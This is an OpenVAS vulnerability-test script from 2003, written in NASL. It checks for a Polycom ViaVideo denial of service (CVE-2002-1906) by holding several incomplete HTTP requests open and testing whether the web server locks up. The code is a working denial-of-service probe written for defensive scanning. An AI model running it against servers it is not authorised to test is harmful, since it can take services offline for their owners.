# OpenVAS Vulnerability Test
# $Id: incomplete_http_requests_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Polycom ViaVideo denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Contact your vendor for a patch

Solution: Upgrade your web server";

tag_summary = "The remote web server locks up when several incomplete web 
requests are sent and the connections are kept open.

Some servers (e.g. Polycom ViaVideo) even run an endless loop, 
using much CPU on the machine. OpenVAS has no way to test this, 
but you'd better check your machine.";


########################
# References:
########################
# 
# Date:	 Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:	advisory@prophecy.net.nz
# To:	bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
########################

if(description)
{
 script_id(11825);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2002-1906");
 script_bugtraq_id(5962);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 
 name = "Polycom ViaVideo denial of service";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 
 summary = "Several incomplete HTTP requests lock the server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies('http_version.nasl', 'httpver.nasl', 'www_multiple_get.nasl');
 script_require_ports("Services/www",80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

#

include('global_settings.inc');
include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


if(http_is_dead(port:port))exit(0);

# 4 is enough for Polycom ViaVideo

# Try to avoid FP on CISCO 7940 phone
max = get_kb_item('www/multiple_get/'+port);
if (max)
{
 imax = max * 2 / 3;
 if (imax < 1)
  imax = 1;
 else if (imax > 5)
  imax = 5;
}
else
 imax = 5;

n = 0;
for (i = 0; i < imax; i++)
{
  soc[i] = http_open_socket(port);
  if(soc[i])
  {
    n ++;
    req = http_get(item:"/", port:port);
    req -= '\r\n';
    send(socket:soc[i], data:req);
  }
}

debug_print(n, ' connections on ', imax, ' were opened\n');

dead = 0;
if(http_is_dead(port: port, retry:1)) dead ++;

for (i = 0; i < imax; i++)
  if (soc[i])
    http_close_socket(soc[i]);

if(http_is_dead(port: port, retry:1)) dead ++;

if (dead == 2)
  security_warning(port);
else if (dead == 1)
{
  report=
"The remote web server locks up when several incomplete web 
requests are sent and the connections are kept open.

However, it runs again when the connections are closed.

Solution: Contact your vendor for a patch

Solution: Upgrade your web server";

  security_warning(port: port, data: report);
}
